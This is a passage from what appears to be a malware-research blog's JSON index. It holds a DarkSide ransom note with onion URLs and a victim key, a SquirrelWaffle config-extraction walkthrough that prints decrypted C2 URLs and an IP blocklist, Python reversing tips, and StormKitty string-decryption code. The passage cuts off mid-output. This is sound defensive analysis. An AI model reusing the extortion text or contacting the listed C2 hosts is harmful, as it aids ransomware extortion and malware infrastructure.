http://darksidc3iux462n6yunevoag52ntvwp6wulaz3zirkmh4cnz6hhj7id.onion/162/thedixiegroup/LCfyHRcwffrYTblpZvoPO3XDbrYPcNu0wVAsH5p49LSjBfzTmtdXT48azXFlMu7q r n On the page you will find examples of files that have been downloaded. r n The data is preloaded and will be automatically published if you do not pay. r n After publication, your data will be available for at least 6 months on our tor cdn servers. r n r n We are ready: r n - To provide you the evidence of stolen data r n - To delete all the stolen data. r n r n r n What guarantees? r n - r n We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests. r n All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems. r n We guarantee to decrypt one file for free. Go to the site and contact us. r n r n How to get access on website? r n - r n Using a TOR browser: r n 1) Download and install TOR browser from this site: https://torproject.org/ r n 2) Open our website: http://dark24zz36xm4y2phwe7yvnkkkkhxionhfrwp67awpb3r3bdcneivoqd.onion/W57MRI9C7YZJUZEABBBYRQLSUTG22JZ9MAH0WT1ISHC405KP7Z2UWY3AI3J68DNM r n r n When you open our website, put the following data in the input form: r n Key: r n r n ug8lgpX3WrFzlEJ6HBWlwJnf7jemhfnlxBw9porj1uuYFTgKbxJQJLYiteQS7DwgZn7dH0fs7qPPWmZ6inPv5GTmSJZNAjGLVIjd4SoiyTdGyophf0zPBxx6uEAOJxM0Woo4ZGeKVoUDHtZsqZNnhMF7aPh54VnKpIJXiZDbZZw4P06xTuw1UMeiTE7wdg7HWZMepAVTzEI2W04RbkPFQHfUgEDcslDxbr83BvopYTYGKFRmtNUMH8OsOZQrOtv50xWDaOfbqxbzfHMJm30QGaGpgylJHQZsscz3XBnwIdvlwBJ9KN4DVgFgziRdvwJrfCP6YN1CYTOQgw1rzqmIU4G1xGYv7rE3jiBY1s4D3Y26SbppTceAVMu1mKx5CFIE3EbtcAsNtEqLHDbPnMCvU6Apwp17TXGob8xXJpEDBZhIzdTaCuybcprwcFNTOzccjbIH81W39MrcJi9mNO3kHRe5fxmIFKvc9v8aQDihGyC65DtdabyBjidXI1NyNONT4PTyrxYqgffPsNDFuzz2yMrXiTAwtAQPqny5BBJQsfVhpLXTtnLvWg1 r n r n !!! DANGER !!! r n DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. r n !!! DANGER !!!&#39; .",
            "url": "https://research.openanalysis.net/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "relUrl": "/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "date": " • Oct 8, 2021"
        }
        
    
  
    
        ,"post32": {
            "title": "SquirrelWaffel Config Extraction",
            "content": "Overview . Notes from our live stream where we reverse engineered the squirrelwaffle loader and built a static config extractor for it. . References . Malware Traffic Analysis Sample 1 | Malware Traffic Analysis Sample 2 | Unpacked Sample (malshare) | . Setup . Make sure you have pefile installed pip install pefile and you change the SAMPLE_PATH to the squirrelwaffle sample you have downloaded. . import pefile . SAMPLE_PATH = r&#39;/tmp/squirrel.bin&#39; data = open(SAMPLE_PATH,&#39;rb&#39;).read() . Extract the .rdata section . The .rdata section has the encrypted data and the decryption keys so let&#39;s grab that first. . pe = pefile.PE(data=data) rdata = None for s in pe.sections: if b&#39;.rdata&#39; in s.Name: rdata = s.get_data() len(rdata) . 20480 . Parse .rdata . The encrypted strings in the .rdata section are followed by their key and all data, keys, and strings are seperated by null bytes. We can parse out the data and key by splitting the .rdata on null bytes then looking for the largest blocks of data. These are likely the encrypted blocklist and the encrypted c2 list. . We want to maintain two lists of data blocks, one sorted and one original order. This way we can use the sorted list to get the largest blocks, and the original order list to find the key which is sequentially after the encrypted data. . blocks = rdata.split(b&#39; x00&#39;) blocks = [x for x in blocks if x != b&#39;&#39;] blocks_sorted = sorted(blocks, key=len) . Decryption function . The config decryption is a simple xor so we want to replicate this in python . def decrypt(key, data): out = &#39;&#39; for i in range(len(data)): out += chr(data[i] ^ key[i % len(key)]) return out . Decrypt the blocklist . The largest encrupted block is likely the blocklist so let&#39;s decrypt that first. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-1]: out = decrypt(blocks[i+1], blocks[i]) print(out) . 94.46.179.80 206.189.205.251 88.242.66.45 85.75.110.214 87.104.3.136 207.244.91.171 49.230.88.160 91.149.252.75 91.149.252.88 92.211.109.152 178.0.250.168 88.69.16.230 95.223.77.160 99.234.62.23 2.206.105.223 84.222.8.201 89.183.239.142 5.146.132.101 77.7.60.154 45.41.106.122 45.74.72.13 74.58.152.123 88.87.68.197 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 185.220.100.249 37.71.173.58 93.2.220.100 188.10.191.109 81.36.17.247 70.28.47.118 45.133.172.222 108.41.227.196 37.235.53.46 162.216.47.22 154.3.42.51 45.86.200.60 212.230.181.152 185.192.70.11 37.142.65.69 87.166.51.31 178.198.76.175 128.90.172.136 172.58.227.224 201.77.112.133 64.124.12.162 87.166.51.28 104.244.72.115 109.70.100.23 192.145.127.220 194.186.142.122 185.207.249.217 52.250.42.144 45.86.201.156 195.245.199.125 213.33.190.70 154.61.71.13 154.13.1.22 191.96.185.151 40.94.25.22 40.94.25.39 40.94.25.5 40.94.25.79 40.94.25.69 40.94.25.71 40.94.25.60 40.94.25.64 40.94.25.29 40.94.25.23 40.94.25.89 40.94.26.165 40.94.26.210 40.94.26.208 40.94.26.166 40.94.26.216 40.94.26.173 40.94.26.182 40.94.35.75 40.94.35.97 40.94.35.27 40.94.35.38 40.94.35.46 40.94.35.76 40.94.35.70 40.94.35.80 40.94.35.98 40.94.35.40 45.86.200.23 198.167.212.98 40.94.31.87 40.94.31.85 40.94.31.29 40.94.31.97 40.94.31.88 40.94.31.80 40.94.31.65 198.167.195.112 40.94.31.58 40.94.31.48 40.94.31.64 40.94.31.26 40.94.31.66 40.94.31.90 40.94.31.46 40.94.31.47 212.119.227.184 72.12.194.93 72.12.194.94 72.12.194.92 134.209.213.55 35.198.84.59 89.208.29.2 40.94.30.159 40.94.30.139 40.94.30.152 40.94.30.167 40.94.30.164 40.94.30.166 40.94.30.174 40.94.30.151 154.61.71.53 40.94.30.157 40.94.30.136 40.94.30.149 52.154.162.74 213.33.190.161 83.84.25.214 162.251.62.154 188.241.177.152 92.211.110.221 154.61.71.51 185.183.107.236 72.12.194.90 40.94.25.36 40.94.29.4 40.94.25.50 40.94.29.31 40.94.25.31 40.94.29.41 40.94.31.5 40.94.25.80 40.94.29.82 40.94.31.81 40.94.25.96 40.94.29.59 40.94.31.3 40.94.25.58 40.94.31.61 40.94.31.49 40.94.31.54 40.94.31.62 40.94.31.70 40.94.30.211 40.94.30.148 40.94.30.218 40.94.30.147 40.94.30.129 40.94.31.15 40.94.30.169 40.94.31.36 40.94.30.223 40.94.30.203 95.211.36.179 64.233.172.102 153.246.206.71 198.167.193.35 90.187.12.209 37.49.116.179 52.167.22.240 160.177.96.15 185.123.143.220 167.99.172.253 40.94.36.81 86.107.21.203 24.37.31.38 71.19.154.84 34.142.74.220 192.160.102.170 216.251.130.74 49.44.76.43 109.147.65.157 86.217.130.91 178.174.15.54 86.242.244.97 92.46.70.105 81.201.234.26 78.94.217.60 141.226.236.91 95.26.228.102 89.208.29.3 213.33.190.205 213.33.190.121 5.154.174.45 23.154.177.3 195.65.152.138 93.231.174.227 185.220.101.132 54.36.101.21 72.12.194.91 46.14.116.174 141.19.232.57 185.220.101.149 45.74.46.69 157.230.210.133 82.199.130.36 104.237.193.28 187.46.138.56 195.164.49.162 156.146.49.135 195.164.49.191 79.104.209.54 35.245.134.90 20.52.139.186 189.139.144.151 94.31.102.187 39.43.45.71 107.189.10.143 39.43.123.57 106.75.76.179 194.186.142.131 210.22.129.194 45.130.83.77 154.6.16.175 162.247.73.192 107.189.1.160 185.107.47.215 46.166.139.111 185.56.80.65 185.220.100.245 209.141.59.180 77.247.181.163 185.220.101.137 185.220.100.242 104.244.76.13 185.83.214.69 185.220.100.252 185.112.146.73 185.57.82.28 89.187.171.116 66.220.242.222 39.43.72.17 5.171.90.80 185.152.32.77 23.129.64.157 92.151.9.187 106.75.31.237 122.167.79.251 109.70.100.33 199.249.230.154 64.233.172.108 64.233.172.106 64.233.172.104 77.247.181.165 107.189.12.240 79.142.76.203 193.128.114.34 185.92.26.59 185.65.210.119 70.39.159.79 70.39.159.29 151.48.26.15 151.48.26.15 2.228.159.178 188.174.248.154 188.174.248.154 95.90.198.182 95.90.198.182 193.0.200.36 193.0.200.36 151.127.13.232 89.97.249.158 212.115.152.225 185.217.117.179 199.249.230.164 80.233.134.134 109.74.154.92 65.39.88.250 90.84.192.187 37.70.202.24 85.203.45.30 109.190.93.219 151.8.114.194 176.235.38.106 149.56.99.85 138.128.136.169 213.82.23.224 192.42.123.107 128.90.151.188 162.245.206.249 85.203.45.40 95.211.95.242 185.220.102.251 66.203.112.160 193.128.108.246 193.128.108.242 31.204.150.74 34.141.245.25 122.167.85.191 212.6.86.133 171.25.193.25 149.3.170.147 162.247.74.217 109.70.100.34 89.208.29.5 79.104.209.91 79.104.209.157 194.186.142.205 198.167.217.20 198.167.193.112 204.101.161.31 198.167.219.82 195.74.76.222 70.93.153.224 87.118.110.27 185.247.225.43 193.128.108.250 188.212.135.7 106.75.75.245 86.142.177.106 185.192.69.77 198.167.209.37 59.144.163.235 193.128.108.243 31.204.152.150 211.177.21.222 87.166.49.39 82.127.202.176 58.40.175.6 94.46.179.80 206.189.205.251 178.255.172.194 84.221.205.40 155.138.242.103 178.212.98.156 85.65.32.191 31.167.184.201 88.242.66.45 36.65.102.42 203.213.127.79 85.75.110.214 93.78.214.187 204.152.81.185 183.171.72.218 168.194.101.130 87.104.3.136 92.211.196.33 197.92.140.125 207.244.91.171 49.230.88.160 196.74.16.153 91.149.252.75 91.149.252.88 92.206.15.202 82.21.114.63 92.211.109.152 178.0.250.168 178.203.145.135 85.210.36.4 199.83.207.72 86.132.134.203 88.69.16.230 99.247.129.88 37.201.195.12 87.140.192.0 88.152.185.188 87.156.177.91 99.229.57.160 95.223.77.160 88.130.54.214 99.234.62.23 2.206.105.223 94.134.179.130 84.221.255.199 84.222.8.201 89.183.239.142 87.158.21.26 93.206.148.216 5.146.132.101 77.7.60.154 95.223.75.85 162.254.173.187 50.99.254.163 45.41.106.122 99.237.13.3 45.74.72.13 108.171.64.202 74.58.152.123 216.209.253.121 88.87.68.197 211.107.25.121 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 177.38.183.13 185.220.100.249 . Decrypt the c2s . The second largest encrupted block is likely the C2 list so let&#39;s decrypt that now. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-2]: out = decrypt(blocks[i+1], blocks[i]) print(out) . celulasmadreenmexico.com.mx/Wt793Aua|gerencial.institutoacqua.org.br/XynFkhJAxnm|dashboard.adlytic.ai/LlvLoc9O3|bussiness-z.ml/3pdEiqsni|ifiengineers.com/hGVc55g2e|bonusvulkanvegas.srdm.in/U7oOxmI1m|ebrouteindia.com/JEqGe1hNR|test.dirigu.ro/dXf4cS4GPL|cablingpoint.com/LjDG0hkp|perfectdemos.com/T6PQGYCMt|afrizam.360cyberlink.com/f36rjSN5D1|giasuphire.tddvn.com/miFO43YP9b|priyacareers.com/GiTHMPbU|assurant.360cyberlink.com/DGx4k8U9Hil|sig.institutoacqua.org.br/tM7tINg2sCU| . Clean up the c2 list . It looks like the C2 list is seperated by pipes | so let&#39;s turn that into a nice list. . print(out.replace(&#39;|&#39;,&#39; n&#39;)) . celulasmadreenmexico.com.mx/Wt793Aua gerencial.institutoacqua.org.br/XynFkhJAxnm dashboard.adlytic.ai/LlvLoc9O3 bussiness-z.ml/3pdEiqsni ifiengineers.com/hGVc55g2e bonusvulkanvegas.srdm.in/U7oOxmI1m ebrouteindia.com/JEqGe1hNR test.dirigu.ro/dXf4cS4GPL cablingpoint.com/LjDG0hkp perfectdemos.com/T6PQGYCMt afrizam.360cyberlink.com/f36rjSN5D1 giasuphire.tddvn.com/miFO43YP9b priyacareers.com/GiTHMPbU assurant.360cyberlink.com/DGx4k8U9Hil sig.institutoacqua.org.br/tM7tINg2sCU .",
            "url": "https://research.openanalysis.net/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "relUrl": "/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "date": " • Sep 27, 2021"
        }
        
    
  
    
        ,"post33": {
            "title": "Reversing Tips With Python3",
            "content": "Overview . Several tips to level up your reverse engineering with Python3. . Tip 1 - Use Juptyper Notebooks and A Git Repo . Remember to steal our .gitignore file to filter out the juptyper junk files. . Tip 2 - Remember Byte Strings Are Not Strings . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) . b&#39;test&#39; test . Example for Tips 3-5 . example_data = b&#39; x02 x00 x00 x00 x00 x04 x00 x00 x00test x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . Example Data Structure . struct strings{ DWORD number_of_strings; string* string; } struct string{ BOOL is_wide_string; DWORD string_length; chr* string; } . Tip 3 - Hex Encoding Binary Data . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) print(&quot;This is hex encoded data: %r&quot; % tohex(example_data)) . This is hex encoded data: b&#39;0200000000040000007465737401040000007400650073007400&#39; . Tip 4 - Use Struct To Convert Between Data and Types . https://docs.python.org/3/library/struct.html . import struct number_of_strings = struct.unpack(&#39;&lt;I&#39;,example_data[:4])[0] print(&quot;Number of strings: %d&quot; % number_of_strings) . Number of strings: 2 . Tip 5 - Use Custom Struct Class To Parse Binary Data . import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; class EXAMPLE_STRING: def __init__(self): self.is_wide_string = False self.string_length = 0 self.string = b&#39;&#39; def from_buffer_copy(self, data): ptr = 0 self.is_wide_string = struct.unpack(&#39;?&#39;, data[ptr:ptr+1])[0] ptr += 1 self.string_length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 if self.is_wide_string: self.string = data[ptr:ptr+(self.string_length*2)].decode(&#39;utf-16le&#39;) ptr += self.string_length*2 else: self.string = data[ptr:ptr+self.string_length].decode(&#39;utf-8&#39;) ptr += self.string_length def pack(self): data = b&#39;&#39; data += struct.pack(&#39;?&#39;, self.is_wide_string) data += struct.pack(&#39;&lt;I&#39;, self.string_length) if self.is_wide_string: data += self.string.encode(&#39;utf-16le&#39;) else: data += self.string.encode(&#39;utf-8&#39;) return data print(&quot;Example string data: %r&quot; % example_string) es = EXAMPLE_STRING() es.from_buffer_copy(example_string) print(&quot;Example is wide: %s&quot; % es.is_wide_string) print(&quot;Example string length: %d&quot; % es.string_length) print(&quot;Example string: %s&quot; % es.string) . Example string data: b&#39; x00 x04 x00 x00 x00test&#39; Example is wide: False Example string length: 4 Example string: test . es.is_wide_string = True print(&quot;Example string data converted to wide: %r&quot; % es.pack()) . Example string data converted to wide: b&#39; x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . class EXAMPLE_STRINGS: def __init__(self): self.length = 0 self.strings = [] def from_buffer_copy(self, data): ptr = 0 self.length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 for i in range(self.length): tmp_string = EXAMPLE_STRING() tmp_string.from_buffer_copy(data[ptr:]) ptr += len(tmp_string.pack()) self.strings.append(tmp_string) def pack(self): data = b&#39;&#39; data += struct.pack(&#39;&lt;I&#39;, self.length) for s in self.strings: data += s.pack() return data es = EXAMPLE_STRINGS() es.from_buffer_copy(example_data) print(&quot;Number of strings: %d&quot; % es.length) print(&quot;First string is wide: %s&quot; % es.strings[0].is_wide_string) print(&quot;First string: %s&quot; % es.strings[0].string) print(&quot;Second string is wide: %s&quot; % es.strings[1].is_wide_string) print(&quot;Second string: %s&quot; % es.strings[1].string) . Number of strings: 2 First string is wide: False First string: test Second string is wide: True Second string: test . Tip 6 - Parse Stream With BytesIO . without position pointer . https://docs.python.org/3/library/io.html#binary-i-o . import io import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; bstream = io.BytesIO(example_string) # transform example_string in stream (like File) is_wide_string, *_ = struct.unpack(&#39;?&#39;, bstream.read(1)) string_length, *_ = struct.unpack(&#39;&lt;I&#39;, bstream.read(4)) string_length = string_length*2 if is_wide_string else string_length strings = bstream.read(string_length).decode(&#39;utf-16le&#39; if is_wide_string else &#39;utf-8&#39;) print(f&#39;is_wide_string: {is_wide_string}&#39;) print(f&#39;string_length: {string_length}&#39;) print(f&#39;string: {strings}&#39;, end=&quot; n n&quot;) # Tip 6.1 - Using lambda bstream.seek(0,0) # beginning of the stream read_byte = lambda bs: bs.read(1)[0] read_dword = lambda bs: struct.unpack(&quot;&lt;I&quot;, bs.read(4))[0] read_utf16le = lambda bs, s: bs.read(s).decode(&quot;utf-16le&quot;) read_utf8 = lambda bs, s: bs.read(s).decode(&quot;utf-8&quot;) print(f&#39;is_wide_string: {read_byte(bstream)}&#39;) print(f&#39;string_length: {read_dword(bstream)}&#39;) if is_wide_string: print(f&#39;string: {read_utf16le(bstream, string_length)}&#39;) else : print(f&#39;string: {read_utf8(bstream, string_length)}&#39;) . is_wide_string: False string_length: 4 string: test is_wide_string: 0 string_length: 4 string: test . Tip 7 - Using Fundamental Data Types With ctypes . e.g., useful to reimplement C pseudo code algorithm in Python . Highly recommended to read ctypes doc for reverser https://docs.python.org/3/library/ctypes.html . print(&quot;WRONG :&quot;) DWORD = 0xFFFFFFFF print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD += 1 print(f&quot;DWORD+1 = {hex(DWORD)} ; WRONG! DWORD size is 4 bytes&quot;) DWORD = 0x0 print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD -= 1 print(f&quot;DWORD-1 = {hex(DWORD)} ; HUM ?!&quot;, end=&quot; n n&quot;) import ctypes print(&quot;GOOD :&quot;) DWORD = ctypes.c_uint32(0xFFFFFFFF) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value += 1 print(f&quot;DWORD+1 = {hex(DWORD.value)} ; GOOD!&quot;) DWORD = ctypes.c_uint32(0x0) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value -= 1 print(f&quot;DWORD-1 = {hex(DWORD.value)}&quot;, end=&quot; n n&quot;) # CAST DATA EAX = ctypes.c_uint32(0xAAAABBBB) AX = ctypes.cast(ctypes.addressof(EAX), ctypes.POINTER(ctypes.c_uint16)) # we can cast print(&quot;EAX =&quot;, hex(EAX.value)) print(&quot;AX =&quot;, hex(AX.contents.value)) . WRONG : DWORD = 0xffffffff DWORD+1 = 0x100000000 ; WRONG! DWORD size is 4 bytes DWORD = 0x0 DWORD-1 = -0x1 ; HUM ?! GOOD : DWORD = 0xffffffff DWORD+1 = 0x0 ; GOOD! DWORD = 0x0 DWORD-1 = 0xffffffff EAX = 0xaaaabbbb AX = 0xbbbb . Tip 8 - Parse Binary Data Straight To Python Structure . e.g, we are parsing UNICODE_STRING C structure (from WinAPI) : . typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING; . from ctypes import Structure from ctypes import wintypes import io class UNICODE_STRING(Structure): _fields_ = [ (&#39;Length&#39;, wintypes.USHORT), (&#39;MaximumLength&#39;, wintypes.USHORT), (&#39;Buffer&#39;, wintypes.WCHAR*1024) # No more 1024 wchar! If more =&gt; CRASH # To keep the example more concise we are not manage the Buffer length ] # UNICODE_STRING data extracted from memory/raw file data = b&#39; x0F x00 x11 x00 x48 x00 x65 x00 x6c x00 x6c x00 x6f x00 x20 x00 x74 x00 x68 x00 x65 x00 x20 x00 x77 x00 x6f x00 x72 x00 x6c x00 x64 x00 x00 x00 x00 x00&#39; stream = io.BytesIO(data) unicode_stru = UNICODE_STRING() stream.readinto(unicode_stru) # deserialization bin to struct print(f&quot;L:{unicode_stru.Length} Max:{unicode_stru.MaximumLength} Str:{unicode_stru.Buffer}&quot;) . L:15 Max:17 Str:Hello the world . Tip 9 - Call C Function from DLL . e.g., we want to analyze the return of GetLogicalDriveStringsW . DWORD GetLogicalDriveStringsW( DWORD nBufferLength, LPWSTR lpBuffer ); . from ctypes import wintypes, windll, byref length = windll.kernel32.GetLogicalDriveStringsW(0,0) # total length required data_string = (wintypes.CHAR*(length*2))() # array of char to access in raw format windll.kernel32.GetLogicalDriveStringsW(length, byref(data_string)) # call api print(&quot;raw: &quot; + str(data_string.raw)) for drive in data_string.raw.rsplit(b&#39; x00 x00&#39;): print(drive.decode(&quot;utf-16le&quot;)) . raw: b&#39;C x00: x00 x00 x00 x00E x00: x00 x00 x00 x00F x00: x00 x00 x00 x00 x00 x00&#39; C: E: F: .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "relUrl": "/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "date": " • Jul 26, 2021"
        }
        
    
  
    
        ,"post34": {
            "title": "Dot NET Static Analysis With Python",
            "content": "Overview . References: . https://github.com/0ffsetTrainingSolutions/MOLERATS/blob/main/StringDecrypt/reactor_decrypt.py | https://pypi.org/project/pythonnet/ | https://github.com/XenocodeRCE/ConfuserEx-Unpacker | https://rhotav.github.io/stringdecryptionwithpythonen | . StormKitty String Decryption . We need a simple task to test our tools and a .NET sample. Let&#39;s try to decrypt the strings from this modified StormKitty stealer (https://github.com/swagkarna/StormKitty). You can download the sample from malshare (https://malshare.com/sample.php?action=detail&amp;hash=16694f6390c59adc1161a1855e9e7904). . If we load the sample in dnspy we can see that there is an AES deryption function that reads a hard coded password and salt that are passed to the generator Rfc2898DeriveBytes and used to generate a key and IV which are then used these to decrypt strings on the fly. . . . To start out simple lets conver the decryption routine into python, then lets use dnlib to parse out all the decryption calls and decrypt the strings. . from Crypto.Cipher import AES def decrypt(ctxt, key, iv): cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(ctxt) # Test with data from dnspy salt = bytes([0xff,64,191,111,23,3,113,119,231,121,252,112,79,32,114,156]) password = bytes([104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,76,105,109,101,114,66,111,121,47,83,116,111,114,109,75,105,116,116,121]) iter_count = 1000 key_size = 256 block_size = 128 key_size_bytes = int(key_size/8) block_size_bytes = int(block_size/8) # Generate the key and IV from the hard coded password and salt # Rfc2898DeriveBytes is a streaming-response object, # so concatenating two successive calls is the same as # doing one call with both lengths added together from Crypto.Protocol import KDF key_bytes = KDF.PBKDF2(password, salt, count=iter_count, dkLen=key_size_bytes+block_size_bytes) ctxt = bytes([191,144,50,4,176,103,41,226,163,145,184,198,37,147,201,246,15,80,188,217,224,55,94,195,60,36,195,150,34,219,225,21]) ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) print(&quot;Decrypted string: %r&quot; % ptxt) . Decrypted string: b&#39; Chromium User Data x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; . # The padding byte is the pad delta so we just have to take a byte # and use it to clip the delta off the end of the data def unpad(data): return data[:-ord(data[len(data)-1:])] print(&quot;Decrypted string: %r&quot; % unpad(ptxt)) . Decrypted string: b&#39; Chromium User Data &#39; . .NET Assembly Analysis . Ok now that we have a decryption routine we can start to look at programmatically analyzing the .NET assembly seaching for the encrypted strings. . First we will need a way to call .NET methods from Python. This will allow us to both execute functionality in the sample as well as take advantage of multiple .NET analysis tools which are themselves written in .NET. For this we will use the pythonnet package (https://github.com/pythonnet/pythonnet/wiki). . Pythonnet Setup . Installing pythonnet is as simple as pip install pythonnet. If you are on mac you will want to first make sure you have mono installed. Mono is the platfrom independent .NET interpreter that allows you to run .NET anywhere. We will use brew with brew install mono. . Once we have pythonnet installed it can be imported into python using import clr. CLR stands for Common Language Runtime which is the actual virtual machine that is used to interpret and execute .NET (I think?). . import sys, struct, clr clr.AddReference(&quot;System.Memory&quot;) from System.Reflection import Assembly, MethodInfo, BindingFlags from System import Type . We are going to use dnlib (https://github.com/0xd4d/dnlib) to interact wiht the .NET assembly. We will need to download the DLL and pass a local path to our python instance. We can build our own from the release ((https://github.com/0xd4d/dnlib/releases) or just download an old compiled version (https://github.com/XenocodeRCE/ConfuserEx-Unpacker/tree/master/DLLS). . DNLIB_PATH = &#39;/tmp/dnlib.dll&#39; clr.AddReference(DNLIB_PATH) import dnlib from dnlib.DotNet import * from dnlib.DotNet.Emit import OpCodes . Like the dnlib DLL we will need to pass the local path to this file to our Python. Then we can use this path to load the .NET module and assembly. . SAMPLE_PATH = &#39;/tmp/6e4802a21c61d349b2a201ec5143e095b57e033d51bb571b90a53749956beac4.bin&#39; module = dnlib.DotNet.ModuleDefMD.Load(SAMPLE_PATH) # we don&#39;t need the assembly for this because we won&#39;t be using invoke # assembly = Assembly.LoadFrom(SAMPLE_PATH) . Now we need to find the decryption method. The process is straight forward, we will iterate through all of the methods for each type in the module (I think type is what a class is converted to in the IL?) and for each method we will check the instructions to find the decryption method. Actually matching the decryption method is a bit of a hack but basically we just find some stuff that is probably unique to the method and search for that. In this case we are looking for instructions that set the AES key size SymmetricAlgorithm::set_KeySize and block size SymmetricAlgorithm::set_BlockSize. . . eFlags = BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic # First find the decryption method decryption_method = None for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 20: continue # Check the first 20 instructions for the AES key set and block set key_set = False block_set = False for ptr in range(20): if &#39;SymmetricAlgorithm::set_KeySize&#39; in method.Body.Instructions[ptr].ToString(): key_set = True if &#39;SymmetricAlgorithm::set_BlockSize&#39; in method.Body.Instructions[ptr].ToString(): block_set = True if key_set and block_set: decryption_method = method break if decryption_method != None: print(decryption_method.FullName) else: print(&quot;Can&#39;t find decryption method!&quot;) . System.String Class69::smethod_1(System.Byte[]) . Now that we know the decryption method we can save its name then we can search for calls to the method name. The actual name is a bit tricky since we want the class name and the method name in order to disambiguate it. The class name will always preceed the method name with :: so we can use that to parse the correct string. . full_name = decryption_method.FullName method_name = str(decryption_method.Name) decryption_method_name = full_name[:full_name.find(method_name)+len(method_name)].split(&quot; &quot;)[-1] . Now we can find all the places where the decryption method is called by searching through all the instructions for a call to the decryption method name. . Once we find a call we need to parse out the arguement which is an array containing the encrypted string. This is is a bit tricky since arrays are split into multiple instructions in the IL. . . Here we can see the call to the decryption method on line 291 and preceeding the call we can see another call to InitializeArray which takes an argument setup with the ldtoken call on line 295. Based on this we can search backwards in the code from the call to the decryption fucntion for the first ldtoken instruction which will be loadin the actual data for the array (containing the encrypted string). . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: print(method.Body.Instructions[ptr-i]) mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken . IL_0011: ldtoken Class71/Struct20 Class71::struct20_6 IL_002B: ldtoken Class71/Struct20 Class71::struct20_14 IL_0045: ldtoken Class71/Struct20 Class71::struct20_19 IL_005F: ldtoken Class71/Struct20 Class71::struct20_2 IL_0079: ldtoken Class71/Struct22 Class71::struct22_0 IL_0093: ldtoken Class71/Struct20 Class71::struct20_4 IL_00AD: ldtoken Class71/Struct20 Class71::struct20_3 IL_00C7: ldtoken Class71/Struct20 Class71::A25CC6D70519A408CEA3AE72EBFF915335C6E6E613B18720FA746D0D8056559B IL_00E1: ldtoken Class71/Struct20 Class71::struct20_18 IL_00FC: ldtoken Class71/Struct20 Class71::struct20_9 IL_0117: ldtoken Class71/Struct20 Class71::struct20_24 IL_0132: ldtoken Class71/Struct20 Class71::struct20_25 IL_014D: ldtoken Class71/Struct20 Class71::BF8CAA158736480861E8F91826FFFA6545B27C3EC30153CA68330811329C2A8E IL_0168: ldtoken Class71/Struct20 Class71::struct20_22 IL_0183: ldtoken Class71/Struct23 Class71::struct23_1 IL_019E: ldtoken Class71/Struct22 Class71::ACDCB1AFB15194F894860BA7E2B85B91B6E5AB701407DFBAC51146F0C6E53B6F IL_01B9: ldtoken Class71/Struct20 Class71::struct20_21 IL_01D4: ldtoken Class71/Struct20 Class71::CE8979E74A40B6869BD5BED7E5610AA981486221166D6F6E65F3B34BF501B8DD IL_01EF: ldtoken Class71/Struct20 Class71::struct20_8 IL_020A: ldtoken Class71/Struct20 Class71::struct20_10 IL_0225: ldtoken Class71/Struct20 Class71::struct20_7 IL_0240: ldtoken Class71/Struct20 Class71::struct20_20 IL_025B: ldtoken Class71/Struct20 Class71::struct20_15 IL_0276: ldtoken 